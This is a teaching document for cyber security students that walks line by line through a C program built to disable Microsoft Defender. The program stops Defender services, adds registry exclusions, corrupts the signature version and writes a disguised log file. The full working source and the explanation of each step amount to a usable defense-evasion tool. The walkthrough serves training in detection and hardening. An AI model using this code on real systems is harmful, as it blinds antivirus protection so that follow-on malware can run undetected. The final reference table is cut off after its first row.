# Shadow Evasion — Line-by-Line Code Documentation

**Module:** Defense Evasion  
**Language:** C (Win32 API)  
**Target Audience:** Cert IV Cyber Security Students  
**Assessment Context:** Final Demo — Red Team / Attack Simulation  

> **Educational Disclaimer:** This document analyses malicious techniques for defensive training only. Understanding how attacks work is essential for building effective detections and hardening strategies.

---

## 1. Overview of What the Program Does

This program is a **Windows Defender disarmer**. Its goal is to blind or cripple Microsoft Defender Antivirus so that follow-on malware can execute without being scanned, blocked, or alerted. It achieves this through four distinct phases:

| Step | Action | Target |
|------|--------|--------|
| 1 | Stop critical Defender-related services | Service Control Manager (SCM) |
| 2 | Add path exclusions to the Defender registry | Windows Registry (`HKLM\...\Exclusions\Paths`) |
| 3 | Corrupt signature metadata (version string) | Windows Registry (`HKLM\...\Signature Updates`) |
| 4 | Write a proof-of-execution log to a masqueraded path | Filesystem (`C:\ProgramData\Microsoft\Windows\Caches\sysmon.log`) |

Each phase targets a different **attack surface** (services, registry, filesystem) and illustrates how legitimate Windows administrative APIs can be abused by an attacker with sufficient privileges (typically Administrator or SYSTEM).

---

## 2. Preprocessor Directives and Headers

```c
#define _CRT_SECURE_NO_WARNINGS
```

**What it does:**  
This is a **preprocessor macro** that tells the Microsoft C Runtime (CRT) to disable "secure" warnings for functions like `strcpy`, `sprintf`, and `strlen`.

**Why it's there:**  
Microsoft Visual Studio emits compiler warnings (C4996) when standard C string functions are used because they are considered unsafe (they do not perform bounds checking). In normal secure development you would use the `_s` variants (e.g., `strcpy_s`). The attacker disables these warnings to keep the code clean and compilable without extra noise. From a defensive coding perspective, this is a red flag: safe string handling is deliberately avoided.

**C Concept:**  
`#define` is a **preprocessor directive**. It operates before compilation (during the pre-processing phase) and performs text substitution. It is not a C statement and does not end with a semicolon.

---

```c
#include <windows.h>
```

**What it does:**  
Includes the main Windows API header. This single header pulls in declarations for thousands of Windows functions, types, macros, and constants: `SC_HANDLE`, `RegOpenKeyExW`, `CreateFileA`, `HANDLE`, `LPCWSTR`, `DWORD`, `BOOL`, etc.

**Why it's there:**  
Without this header, the compiler would not recognise any Windows-specific types or function prototypes. This program is entirely dependent on Win32 APIs rather than standard C library calls.

---

```c
#include <stdio.h>
```

**What it does:**  
Includes the Standard Input/Output header, part of the C standard library. It provides declarations for `printf`, `fprintf`, `sprintf`, file I/O, etc.

**Why it's there:**  
In this specific program, `stdio.h` is not strictly required because no `printf` or `scanf` calls are used. It may be a leftover from development/debugging, or included out of habit. However, some compilers implicitly rely on types defined here. It does no harm.

---

```c
#include <string.h>
```

**What it does:**  
Includes the C Standard String header, providing `strlen`, `strcpy`, `memcmp`, `memset`, etc.

**Why it's there:**  
`strlen` is used later in `WriteProof` to calculate the length of the ASCII message string before writing it to disk.

---

```c
// CSEC Final Demo — Defense Evasion Module
// Terminates Defender services, writes exclusions, nulls signature metadata
```

**What it does:**  
These are C-style comments (`//` single-line comments introduced in C99).

**Why it's there:**  
They document the attacker's intent. The comment explicitly states the three goals: terminate services, write exclusions, and null signature metadata. In a real-world malware sample, such comments would be stripped. Their presence here indicates this is a teaching or demonstration specimen.

---

## 3. Function: `StopService`

### Purpose
Uses the **Service Control Manager (SCM)** to send a stop command to a named Windows service.

### Full Function

```c
BOOL StopService(LPCWSTR svcName)
{
    SC_HANDLE hScm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (!hScm) return FALSE;

    SC_HANDLE hSvc = OpenServiceW(hScm, svcName, SERVICE_STOP | SERVICE_QUERY_STATUS);
    if (!hSvc) {
        CloseServiceHandle(hScm);
        return FALSE;
    }

    SERVICE_STATUS status;
    BOOL result = ControlService(hSvc, SERVICE_CONTROL_STOP, &status);
    CloseServiceHandle(hSvc);
    CloseServiceHandle(hScm);
    return result;
}
```

---

#### Line-by-Line Breakdown

```c
BOOL StopService(LPCWSTR svcName)
```

**What it does:**  
Declares a function named `StopService` that returns a `BOOL` (Windows typedef for a 32-bit integer used as a boolean: `TRUE` = non-zero, `FALSE` = 0). It accepts one parameter: `svcName` of type `LPCWSTR`.

**Key Concept — `LPCWSTR`:**  
- `L` = Long pointer (legacy terminology, now just means pointer).  
- `P` = Pointer.  
- `C` = Constant (the string will not be modified by the function).  
- `W` = Wide (16-bit Unicode characters, `wchar_t` in Windows).  
- `STR` = String.  
So `LPCWSTR` is a **pointer to a constant wide-character (Unicode) string**.

---

```c
    SC_HANDLE hScm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
```

**What it does:**  
Calls `OpenSCManagerW` to establish a connection to the **Service Control Manager** on the local machine.

**Parameter 1 (`NULL`):** Machine name. `NULL` means the local computer.  
**Parameter 2 (`NULL`):** Database name. `NULL` means the active services database (`SERVICES_ACTIVE_DATABASE`).  
**Parameter 3 (`SC_MANAGER_CONNECT`):** Requested access rights. `SC_MANAGER_CONNECT` asks only for permission to connect to the SCM (the minimum right needed to subsequently open a service).

**Return Value:**  
An `SC_HANDLE` (a typedef for a service handle). On failure, it returns `NULL`.

**Windows API Concept — Service Control Manager (SCM):**  
The SCM (`services.exe`) is the central authority in Windows that manages the lifetime of all services: starting, stopping, pausing, configuring, and enumerating them. Every service operation begins with a call to `OpenSCManager`. The SCM database is stored in the registry under `HKLM\SYSTEM\CurrentControlSet\Services`.

---

```c
    if (!hScm) return FALSE;
```

**What it does:**  
Checks if `hScm` is `NULL` (falsy). If the SCM could not be opened, the function immediately returns `FALSE`.

**Why it's there:**  
This is **defensive coding** (ironic in attack code). If the attacker does not have Administrator privileges, `OpenSCManagerW` will fail with `ERROR_ACCESS_DENIED` (5), and the handle will be `NULL`. The program aborts this step rather than crashing.

---

```c
    SC_HANDLE hSvc = OpenServiceW(hScm, svcName, SERVICE_STOP | SERVICE_QUERY_STATUS);
```

**What it does:**  
Opens a handle to a specific service identified by `svcName`, requesting permissions to stop it and query its status.

**Parameter 1 (`hScm`):** A valid handle to the SCM obtained in the previous step.  
**Parameter 2 (`svcName`):** The display name or service name (e.g., `L"WinDefend"`).  
**Parameter 3 (`SERVICE_STOP | SERVICE_QUERY_STATUS`):** A **bitwise OR** of two access masks. `SERVICE_STOP` grants the right to stop the service; `SERVICE_QUERY_STATUS` grants the right to ask the service what state it is in.

**Windows API Concept — `OpenServiceW`:**  
`OpenServiceW` does not start or stop anything; it merely retrieves a handle with specific access rights. Windows security relies on **access tokens** and **access control lists (ACLs)**. If the caller's token does not have the `SeServiceLogonRight` or is not in the Administrators group, this call fails.

---

```c
    if (!hSvc) {
        CloseServiceHandle(hScm);
        return FALSE;
    }
```

**What it does:**  
If the service handle could not be obtained (e.g., the service does not exist, or access is denied), the code closes the SCM handle to prevent a **handle leak**, then returns `FALSE`.

**Why it's there:**  
Handle leaks exhaust system resources over time. Even malware authors must clean up handles to remain stealthy and stable.

---

```c
    SERVICE_STATUS status;
```

**What it does:**  
Declares a variable of type `SERVICE_STATUS` on the stack (local memory).

**Windows API Concept — `SERVICE_STATUS`:**  
This structure is defined in `windows.h` and contains fields describing a service's current state:
- `dwServiceType` — e.g., `SERVICE_WIN32_OWN_PROCESS`
- `dwCurrentState` — e.g., `SERVICE_RUNNING`, `SERVICE_STOPPED`
- `dwControlsAccepted` — which control codes the service accepts
- `dwWin32ExitCode`, `dwServiceSpecificExitCode`, `dwCheckPoint`, `dwWaitHint`

Even though the attacker does not inspect these values afterwards, `ControlService` requires a valid pointer to this structure to write the service's response into.

---

```c
    BOOL result = ControlService(hSvc, SERVICE_CONTROL_STOP, &status);
```

**What it does:**  
Sends a **stop control code** to the service.

**Parameter 1 (`hSvc`):** Handle to the service with `SERVICE_STOP` access.  
**Parameter 2 (`SERVICE_CONTROL_STOP`):** The control code. This is not a direct kill signal; it is a polite request asking the service to shut itself down gracefully.  
**Parameter 3 (`&status`):** Pointer to the `SERVICE_STATUS` structure where the service's state before/after the control is recorded.

**Windows API Concept — `ControlService`:**  
Services run inside `services.exe` or as their own process. When `ControlService` is called, the SCM locates the service's process and delivers the control code through a control handler function that the service registered when it started (via `RegisterServiceCtrlHandler`). Well-written services catch this and perform cleanup. However, forcing a stop on a protected service usually requires `SERVICE_STOP` + `SERVICE_QUERY_STATUS` plus Administrator rights.

**Important Note:**  
Some Defender services (e.g., `WdBoot`) are **boot-start drivers**. `ControlService` cannot stop a boot driver while the system is running; it may return `ERROR_ACCESS_DENIED` or require a reboot. The code does not check for this.

---

```c
    CloseServiceHandle(hSvc);
    CloseServiceHandle(hScm);
    return result;
```

**What it does:**  
Closes both handles in reverse order of acquisition (service first, then SCM) and returns the `BOOL` from `ControlService`.

**Why reverse order?**  
While not strictly required by Windows, closing inner/dependent resources before outer resources is a good practice. Once the SCM handle is closed, the service handle is implicitly invalid anyway.

---

## 4. Function: `AddDefenderExclusion`

### Purpose
Writes a path exclusion into the Windows Defender registry so that files in that path are ignored by real-time protection and on-demand scans.

### Full Function

```c
BOOL AddDefenderExclusion(LPCWSTR path)
{
    HKEY hKey;
    WCHAR keyPath[] = L"SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths";
    
    LONG result = RegOpenKeyExW(HKEY_LOCAL_MACHINE, keyPath, 0, KEY_WRITE, &hKey);
    if (result != ERROR_SUCCESS) return FALSE;

    DWORD val = 0;
    result = RegSetValueExW(hKey, path, 0, REG_DWORD, (BYTE*)&val, sizeof(val));
    RegCloseKey(hKey);
    return result == ERROR_SUCCESS;
}
```

---

#### Line-by-Line Breakdown

```c
BOOL AddDefenderExclusion(LPCWSTR path)
```

**What it does:**  
Declares a function that takes a wide-character string representing a filesystem path and returns a boolean success indicator.

---

```c
    HKEY hKey;
```

**What it does:**  
Declares a variable of type `HKEY` — a handle to an open registry key.

**Windows API Concept — `HKEY`:**  
The Windows Registry is a hierarchical database. `HKEY` is an opaque handle type (internally a pointer or index) used to refer to an open key. Common predefined keys are `HKEY_LOCAL_MACHINE` (HKLM), `HKEY_CURRENT_USER` (HKCU), `HKEY_CLASSES_ROOT`, etc.

---

```c
    WCHAR keyPath[] = L"SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths";
```

**What it does:**  
Initialises a **wide-character string array** containing the registry path to Defender's exclusions.

**C Concept — Array Initialisation:**  
`WCHAR keyPath[] = ...` tells the compiler to allocate exactly enough `WCHAR` elements to hold the string plus a null terminator (`\0`). `WCHAR` is Windows' typedef for a 16-bit Unicode character (`wchar_t` on Windows).

**The `L` prefix:**  
The `L` before the string literal makes it a **wide string literal** (each character is 16 bits, UTF-16LE encoding on Windows).

**The double backslashes (`\\`):**  
In C string literals, the backslash is the escape character. To represent a literal backslash in the actual string data, you must write `\\` in the source code. The registry path separator is a backslash, so each one must be escaped.

**Registry Path Explained:**  
- `SOFTWARE` — The sub-tree for application-specific settings (64-bit view on 64-bit Windows).  
- `Microsoft\Windows Defender` — Defender's private configuration hive.  
- `Exclusions\Paths` — The specific key where path-based exclusions are stored as **value names**.

---

```c
    LONG result = RegOpenKeyExW(HKEY_LOCAL_MACHINE, keyPath, 0, KEY_WRITE, &hKey);
```

**What it does:**  
Opens the registry key for writing.

**Parameter 1 (`HKEY_LOCAL_MACHINE`):** A predefined handle to the `HKLM` hive. This hive stores system-wide configuration and requires Administrator privileges to write to most sub-keys.  
**Parameter 2 (`keyPath`):** The sub-key path under `HKLM`.  
**Parameter 3 (`0`):** `ulOptions`. Reserved, must be zero.  
**Parameter 4 (`KEY_WRITE`):** The desired access mask. This combines `KEY_SET_VALUE` and `KEY_CREATE_SUB_KEY`, allowing the caller to create/modify values.  
**Parameter 5 (`&hKey`):** Output parameter. The function writes the newly opened handle into this address.

**Return Value:**  
A `LONG` error code. `ERROR_SUCCESS` (0) means the key was opened.

**Windows API Concept — `RegOpenKeyExW`:**  
Unlike `RegCreateKeyEx`, `RegOpenKeyEx` only opens existing keys. If the key does not exist, it fails. This is safer for the attacker because it avoids accidentally creating new keys that might be more visible.

---

```c
    if (result != ERROR_SUCCESS) return FALSE;
```

**What it does:**  
If the registry key could not be opened (e.g., no Admin rights, Tamper Protection enabled, key missing), abort.

---

```c
    DWORD val = 0;
```

**What it does:**  
Declares a 32-bit unsigned integer (`DWORD` — Double WORD, where a WORD is 16 bits) and initialises it to `0`.

**Why 0?**  
In Defender's registry schema, each exclusion path is stored as a **value name**, and its data is a `DWORD`. The value `0` means "exclude this path from scanning." The exact meaning is internal to Defender, but `0` represents "disabled / excluded" in this context.

---

```c
    result = RegSetValueExW(hKey, path, 0, REG_DWORD, (BYTE*)&val, sizeof(val));
```

**What it does:**  
Creates or updates a registry value inside the opened key.

**Parameter 1 (`hKey`):** Handle to the open key (`...\Exclusions\Paths`).  
**Parameter 2 (`path`):** The **name of the value**. In Defender's exclusion key, the value *name* is the actual path string (e.g., `C:\Windows\Temp`), and the value *data* is the `DWORD`.  
**Parameter 3 (`0`):** Reserved, must be zero.  
**Parameter 4 (`REG_DWORD`):** The data type. A `DWORD` is a 32-bit unsigned integer.  
**Parameter 5 (`(BYTE*)&val`):** A pointer to the raw bytes of `val`. `RegSetValueExW` expects a `const BYTE*` because registry values can hold any binary blob. The `(BYTE*)` is a **type cast** forcing the compiler to treat the address of a `DWORD` as a pointer to bytes.  
**Parameter 6 (`sizeof(val)`):** The number of bytes to write. `sizeof(DWORD)` is 4 on Windows.

**Windows API Concept — `RegSetValueExW`:**  
This is the primary function for writing registry data. Registry values have three components:
1. **Value Name** — like a filename inside the key.
2. **Value Type** — `REG_SZ`, `REG_DWORD`, `REG_BINARY`, etc.
3. **Value Data** — the payload.

By storing the path as the value *name*, Defender can quickly enumerate exclusions by listing value names under this key.

---

```c
    RegCloseKey(hKey);
    return result == ERROR_SUCCESS;
```

**What it does:**  
Closes the registry handle to release the resource, then returns whether `RegSetValueExW` succeeded.

---

## 5. Function: `ClearSignatures`

### Purpose
Corrupts the signature version metadata in the registry, tricking Defender into believing it has signature version `0.0.0.0`. This effectively neutralises threat intelligence.

### Full Function

```c
BOOL ClearSignatures(void)
{
    HKEY hKey;
    WCHAR keyPath[] = L"SOFTWARE\\Microsoft\\Windows Defender\\Signature Updates";
    
    LONG result = RegOpenKeyExW(HKEY_LOCAL_MACHINE, keyPath, 0, KEY_WRITE, &hKey);
    if (result != ERROR_SUCCESS) return FALSE;

    WCHAR sigVer[] = L"0.0.0.0";
    RegSetValueExW(hKey, L"SignatureVersion", 0, REG_SZ, (BYTE*)sigVer, (wcslen(sigVer) + 1) * sizeof(WCHAR));
    RegCloseKey(hKey);
    return TRUE;
}
```

---

#### Line-by-Line Breakdown

```c
BOOL ClearSignatures(void)
```

**What it does:**  
Declares a function taking no parameters and returning `BOOL`.

**C Concept — `void` parameter list:**  
In C, `void` inside the parameter list explicitly means the function accepts **no arguments**. This is different from C++ or empty parentheses in older C, which can imply unspecified parameters.

---

```c
    HKEY hKey;
    WCHAR keyPath[] = L"SOFTWARE\\Microsoft\\Windows Defender\\Signature Updates";
```

**What it does:**  
Declares a registry handle and the path to Defender's signature update configuration.

**Registry Path Explained:**  
`Signature Updates` contains values like:
- `SignatureVersion` — the current AV definition version (e.g., `1.397.1234.0`).
- `UpdateTime` — when signatures were last updated.
By corrupting `SignatureVersion`, the AV engine may believe definitions are present but version zero, causing it to fail to match threats against known signatures.

---

```c
    LONG result = RegOpenKeyExW(HKEY_LOCAL_MACHINE, keyPath, 0, KEY_WRITE, &hKey);
    if (result != ERROR_SUCCESS) return FALSE;
```

**What it does:**  
Identical pattern to `AddDefenderExclusion`: opens the key for writing, aborts on failure.

---

```c
    WCHAR sigVer[] = L"0.0.0.0";
```

**What it does:**  
Creates a wide-character string array containing the fake version number `0.0.0.0`.

**Why `0.0.0.0`?**  
Defender expects a dotted version string. Setting it to all zeros is a minimalist way to invalidate the signature database. The engine may interpret this as "no signatures installed" or "signatures are at the very first revision," causing all signature-based detection to fail because there are no threat definitions associated with version 0.

---

```c
    RegSetValueExW(hKey, L"SignatureVersion", 0, REG_SZ, (BYTE*)sigVer, (wcslen(sigVer) + 1) * sizeof(WCHAR));
```

**What it does:**  
Writes the fake version string into the `SignatureVersion` value.

**Parameter 1 (`hKey`):** Open registry handle.  
**Parameter 2 (`L"SignatureVersion"`):** The name of the value to create/overwrite.  
**Parameter 3 (`0`):** Reserved.  
**Parameter 4 (`REG_SZ`):** The data type — a null-terminated **string** (Unicode because we use the `W` suffix).  
**Parameter 5 (`(BYTE*)sigVer`):** Pointer to the raw bytes of the string.  
**Parameter 6 (`(wcslen(sigVer) + 1) * sizeof(WCHAR)`):** The total size in bytes.

**Breaking down the size calculation:**
- `wcslen(sigVer)` — counts the number of **characters** in the wide string, not including the null terminator. For `"0.0.0.0"`, this is 7.
- `+ 1` — adds room for the null terminator (`\0`).
- `* sizeof(WCHAR)` — multiplies by 2 (since `WCHAR` is 2 bytes on Windows) to get the total byte count.  
Total = (7 + 1) × 2 = **16 bytes**.

**C Concept — `wcslen` vs `strlen`:**  
- `strlen` operates on `char*` (ASCII/UTF-8 strings, 1 byte per character).  
- `wcslen` operates on `wchar_t*` / `WCHAR*` (wide strings, 2 bytes per character on Windows).  
Using the wrong function would result in incorrect buffer sizes and potential buffer overflows or truncated data.

---

```c
    RegCloseKey(hKey);
    return TRUE;
```

**What it does:**  
Closes the registry handle. Unlike the previous function, this one returns `TRUE` unconditionally, even if `RegSetValueExW` failed. This is a minor bug/oversight in the code — it does not capture or check the return value of `RegSetValueExW`.

---

## 6. Function: `WriteProof`

### Purpose
Writes an ASCII log message to a file path that masquerades as a legitimate Windows cache file. This serves as proof-of-execution for the attacker (or in this educational context, proof the demo ran).

### Full Function

```c
void WriteProof(LPCSTR msg)
{
    HANDLE hFile = CreateFileA(
        "C:\\ProgramData\\Microsoft\\Windows\\Caches\\sysmon.log",
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD written;
        WriteFile(hFile, msg, (DWORD)strlen(msg), &written, NULL);
        CloseHandle(hFile);
    }
}
```

---

#### Line-by-Line Breakdown

```c
void WriteProof(LPCSTR msg)
```

**What it does:**  
Declares a function with **no return value** (`void`) taking an `LPCSTR` parameter.

**Key Concept — `LPCSTR`:**  
- `L` = Long pointer  
- `P` = Pointer  
- `C` = Constant  
- `STR` = String  
Unlike `LPCWSTR`, there is **no `W`**, so this is a pointer to a constant **narrow-character (ASCII/ANSI)** string (`char*`).

---

```c
    HANDLE hFile = CreateFileA(
        "C:\\ProgramData\\Microsoft\\Windows\\Caches\\sysmon.log",
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
```

**What it does:**  
Creates or overwrites a file on disk and returns a handle to it.

**Parameter 1 (filename):**  
`"C:\\ProgramData\\Microsoft\\Windows\\Caches\\sysmon.log"`

- `C:\ProgramData` — A hidden/system directory where applications store global data. It is writable by standard users for some subdirectories, but `Microsoft\Windows` is protected.
- `Microsoft\Windows\Caches` — A **masqueraded path**. The attacker is pretending this is a legitimate Windows cache file. `sysmon.log` sounds like a Sysinternals Sysmon log, but it is just a text file created by the attacker.
- The double backslashes (`\\`) are again C escape sequences for literal backslashes.

**Parameter 2 (`GENERIC_WRITE`):**  
Requests write access to the file.

**Parameter 3 (`0`):**  
Share mode. `0` means **no sharing** — no other process can open this file while we hold the handle.

**Parameter 4 (`NULL`):**  
Security attributes. `NULL` means the file gets a default security descriptor inherited from the parent process token.

**Parameter 5 (`CREATE_ALWAYS`):**  
Creation disposition. If the file exists, it is **truncated to zero length** (overwritten). If it does not exist, it is created. This ensures the proof is always fresh.

**Parameter 6 (`FILE_ATTRIBUTE_NORMAL`):**  
No special attributes (not hidden, not read-only, not system).

**Parameter 7 (`NULL`):**  
Template file handle. Unused here.

**Return Value:**  
A `HANDLE`. If the function fails, it returns `INVALID_HANDLE_VALUE` (defined as `(HANDLE)-1`).

**Windows API Concept — `CreateFileA` vs `CreateFileW`:**  
Windows has two versions of most string-based APIs:
- The `A` (ANSI) version accepts `char*` strings in the system's default code page (usually Windows-1252 on Western systems).
- The `W` (Wide/Unicode) version accepts `WCHAR*` UTF-16 strings.
The attacker chose `A` here because the string literal is a simple ASCII path with no special characters.

---

```c
    if (hFile != INVALID_HANDLE_VALUE) {
```

**What it does:**  
Checks if the file was successfully created/opened.

**Why it's there:**  
If the attacker does not have permission to write to that location (which is likely without elevation), `CreateFileA` fails. The code silently skips the write rather than crashing.

---

```c
        DWORD written;
```

**What it does:**  
Declares a `DWORD` variable that will receive the number of bytes actually written to the file.

---

```c
        WriteFile(hFile, msg, (DWORD)strlen(msg), &written, NULL);
```

**What it does:**  
Writes the contents of `msg` to the file.

**Parameter 1 (`hFile`):** File handle.  
**Parameter 2 (`msg`):** Pointer to the buffer to write.  
**Parameter 3 (`(DWORD)strlen(msg)`):** Number of bytes to write. `strlen` counts characters in a narrow string (1 byte each for ASCII). The `(DWORD)` is an explicit cast from `size_t` (the return type of `strlen`) to `DWORD` (32-bit unsigned).  
**Parameter 4 (`&written`):** Output parameter — the function fills this with the actual bytes written.  
**Parameter 5 (`NULL`):** Overlapped I/O structure. `NULL` means synchronous (blocking) write.

**C Concept — `strlen`:**  
`strlen` traverses the string from the pointer address forward until it finds the null terminator (`\0`), counting how many non-null characters exist. It does **not** count the terminator itself, so if you need to write the terminator too, you would add `+1`.

---

```c
        CloseHandle(hFile);
    }
}
```

**What it does:**  
Closes the file handle, flushing any buffered data to disk and releasing the kernel object. The function then returns.

---

## 7. Function: `main`

### Purpose
The program entry point. Orchestrates the four attack phases.

### Full Function

```c
int main(void)
{
    // Step 1: Stop core Defender services
    StopService(L"WinDefend");
    StopService(L"WdNisSvc");
    StopService(L"Sense");
    StopService(L"WdBoot");

    // Step 2: Add broad exclusions for staging directories
    AddDefenderExclusion(L"C:\\Windows\\Temp");
    AddDefenderExclusion(L"C:\\Users\\%USERNAME%\\Desktop");
    AddDefenderExclusion(L"C:\\ProgramData");

    // Step 3: Corrupt signature metadata so Defender has no threat intel
    ClearSignatures();

    // Step 4: Proof of execution
    WriteProof("[OK] System maintenance complete.\n");

    return 0;
}
```

---

#### Line-by-Line Breakdown

```c
int main(void)
```

**What it does:**  
The **entry point** of every C program. `int` means it returns an integer to the operating system. `void` means it takes no command-line arguments (the `argc`/`argv` style is omitted here).

**C Concept — Program Entry Point:**  
When Windows loads the executable, the C runtime initialises the heap, standard I/O, and environment variables, then calls `main`. The return value is passed back to the OS (accessible via `ERRORLEVEL` in `cmd.exe`). `0` traditionally means success.

---

```c
    StopService(L"WinDefend");
```

**What it does:**  
Attempts to stop the **Windows Defender Service** (`WinDefend`).

**Defender Architecture Concept:**  
`WinDefend` is the primary antimalware service. It hosts the real-time protection engine, behaviour monitoring, and on-demand scan scheduler. Stopping it disables the core AV functionality.

---

```c
    StopService(L"WdNisSvc");
```

**What it does:**  
Attempts to stop the **Windows Defender Network Inspection Service**.

**Defender Architecture Concept:**  
`WdNisSvc` (often called "Defender Antivirus Network Inspection System") monitors network traffic for malicious payloads and command-and-control (C2) communication. Stopping it removes network-level protections.

---

```c
    StopService(L"Sense");
```

**What it does:**  
Attempts to stop the **Windows Defender Advanced Threat Protection (ATP) / Microsoft Defender for Endpoint** sense service.

**Defender Architecture Concept:**  
The `Sense` service is the telemetry and detection agent for Defender for Endpoint (formerly ATP). It collects behavioural signals, sends telemetry to the Microsoft cloud, and receives advanced detection rules. Stopping it blinds cloud-backed EDR (Endpoint Detection and Response) capabilities.

---

```c
    StopService(L"WdBoot");
```

**What it does:**  
Attempts to stop the **Windows Defender Boot Driver**.

**Defender Architecture Concept:**  
`WdBoot` is a **boot-start driver** (type `SERVICE_BOOT_START`). It loads early in the boot sequence to provide rootkit detection and protected process light (PPL) enforcement. As noted earlier, `ControlService` generally **cannot** stop a boot driver at runtime. This call likely fails silently. The attacker may have included it for completeness or in the hope that disabling it in the registry will take effect on next reboot.

---

```c
    AddDefenderExclusion(L"C:\\Windows\\Temp");
```

**What it does:**  
Adds `C:\Windows\Temp` to the Defender exclusion list.

**Why this path?**  
`C:\Windows\Temp` is a world-writable directory where malware often stages payloads, drops secondary binaries, or stores temporary scripts. By excluding it, any file written there is invisible to Defender's real-time scanner.

---

```c
    AddDefenderExclusion(L"C:\\Users\\%USERNAME%\\Desktop");
```

**What it does:**  
Attempts to add a path containing the literal string `%USERNAME%` as an exclusion.

**Critical Bug / Educational Note:**  
The `%USERNAME%` string here is **not expanded** by the Windows API. It is treated as a literal path name. The actual user profile path would be something like `C:\Users\gwu07\Desktop`. To dynamically get the username, the attacker should have called `ExpandEnvironmentStringsW` or retrieved the path via `SHGetKnownFolderPath`. Because this literal string does not match any real directory on disk, this exclusion is effectively useless. In a real engagement, this would be a mistake.

---

```c
    AddDefenderExclusion(L"C:\\ProgramData");
```

**What it does:**  
Adds `C:\ProgramData` as an exclusion.

**Why this path?**  
`ProgramData` is the default location where applications store global data. It is also a common malware persistence location (scheduled tasks, startup files, configuration data). Excluding the entire directory is extremely broad and dangerous.

---

```c
    ClearSignatures();
```

**What it does:**  
Corrupts the signature version registry value.

---

```c
    WriteProof("[OK] System maintenance complete.\n");
```

**What it does:**  
Writes a masqueraded success message to disk.

**Why the masquerade?**  
The message "System maintenance complete" is designed to sound benign if someone reads the file. The file path (`...\Caches\sysmon.log`) is also chosen to blend in with legitimate Windows files. This is an example of **adversary masquerading** (MITRE ATT&CK technique T1036).

---

```c
    return 0;
}
```

**What it does:**  
Returns `0` to the operating system, indicating the process exited successfully.

---

## 8. Key Concepts Reference

### 8.1 Service Control Manager (SCM)

The **Service Control Manager** is a system process (`services.exe`) that starts, stops, and interacts with Windows services. Services are long-running background processes that do not require a logged-in user (e.g., database engines, antivirus, print spoolers).

Services are defined in the registry under:
```
HKLM\SYSTEM\CurrentControlSet\Services
```

Each service has:
- A **Service Name** (internal identifier, e.g., `WinDefend`)
- A **Display Name** (human-readable, e.g., "Windows Defender Antivirus Service")
- A **Start Type** (`BOOT_START`, `AUTO_START`, `DEMAND_START`, `DISABLED`)
- A **Service Type** (`KERNEL_DRIVER`, `WIN32_OWN_PROCESS`, etc.)
- An **Object Name** (the account it runs under, e.g., `NT AUTHORITY\SYSTEM`)

### 8.2 `OpenSCManagerW`

```c
SC_HANDLE OpenSCManagerW(
    LPCWSTR lpMachineName,
    LPCWSTR lpDatabaseName,
    DWORD   dwDesiredAccess
);
```

This is the **gateway** to all service operations. Without a valid SCM handle, you cannot open, start, stop, or configure services. The `W` suffix indicates it accepts wide-character (Unicode) strings.

### 8.3 `OpenServiceW`

```c
SC_HANDLE OpenServiceW(
    SC_HANDLE hSCManager,
    LPCWSTR   lpServiceName,
    DWORD     dwDesiredAccess
);
```

Retrieves a handle to an existing service object. The `dwDesiredAccess` mask enforces security: if your process token does not have the required privileges, the call fails.

### 8.4 `ControlService`

```c
BOOL ControlService(
    SC_HANDLE        hService,
    DWORD            dwControl,
    LPSERVICE_STATUS lpServiceStatus
);
```

Sends a control code to a service. Common codes:
- `SERVICE_CONTROL_STOP` (1)
- `SERVICE_CONTROL_PAUSE` (2)
- `SERVICE_CONTROL_CONTINUE` (3)

Services must explicitly handle these codes in their control handler. If a service is hung or does not implement the handler, `ControlService` may return an error or time out.

### 8.5 Windows Registry

The Registry is a hierarchical database storing configuration for the OS, hardware, users, and applications. It consists of **hives** (files on disk like `SYSTEM`, `SOFTWARE`, `SAM`) mounted under root keys (`HKEY_*`).

**Anatomy of a Registry Path:**
```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths
\_______ Hive _______/ \___________ Key Path ____________/ \_Subkey_/
```

### 8.6 `HKEY_LOCAL_MACHINE` (HKLM)

A predefined handle to the local machine hive. It stores **system-wide** settings. Writing to HKLM requires Administrator rights (or specific privileges like `SeRestorePrivilege`).

### 8.7 `RegOpenKeyExW`

```c
LONG RegOpenKeyExW(
    HKEY    hKey,
    LPCWSTR lpSubKey,
    DWORD   ulOptions,
    REGSAM  samDesired,
    PHKEY   phkResult
);
```

Opens an existing registry key. The return type is `LONG`, not `BOOL`. Always compare against `ERROR_SUCCESS` (which is `0`). A common beginner mistake is checking `if (!result)` — this actually works for `ERROR_SUCCESS` because `0` is falsy, but it is semantically clearer to write `if (result == ERROR_SUCCESS)`.

### 8.8 `RegSetValueExW`

```c
LONG RegSetValueExW(
    HKEY       hKey,
    LPCWSTR    lpValueName,
    DWORD      Reserved,
    DWORD      dwType,
    const BYTE *lpData,
    DWORD      cbData
);
```

Creates or updates a named value under an open key. The `lpData` parameter is `const BYTE*` because registry values are fundamentally binary blobs; the `dwType` tells the consumer how to interpret those bytes.

### 8.9 `LPCWSTR` vs `LPCSTR`

| Type | Character Size | Encoding | Literal Prefix | Typical API Suffix |
|------|---------------|----------|----------------|-------------------|
| `LPCSTR` | 1 byte | ANSI / MBCS / UTF-8 | `"hello"` | `A` (e.g., `CreateFileA`) |
| `LPCWSTR` | 2 bytes | UTF-16LE | `L"hello"` | `W` (e.g., `CreateFileW`) |

Windows NT-family operating systems (all modern Windows) are natively Unicode. The `A` functions are thin wrappers that convert ANSI to Unicode and call the `W` function internally. Modern Windows development should prefer `W` APIs, but malware authors may use `A` for simplicity when dealing with ASCII-only data.

### 8.10 Wide Character Strings (`WCHAR`, `L"..."`)

In C, a string literal like `"hello"` is an array of `char` (8-bit). A wide string literal `L"hello"` is an array of `wchar_t` (16-bit on Windows). Because every Windows API that takes text has two versions, consistent use of `W` types avoids character-set conversion bugs.

### 8.11 Windows Defender Architecture (Simplified)

| Component | Service Name | Role |
|-----------|-------------|------|
| Antimalware Engine | `WinDefend` | Core scanning, real-time protection |
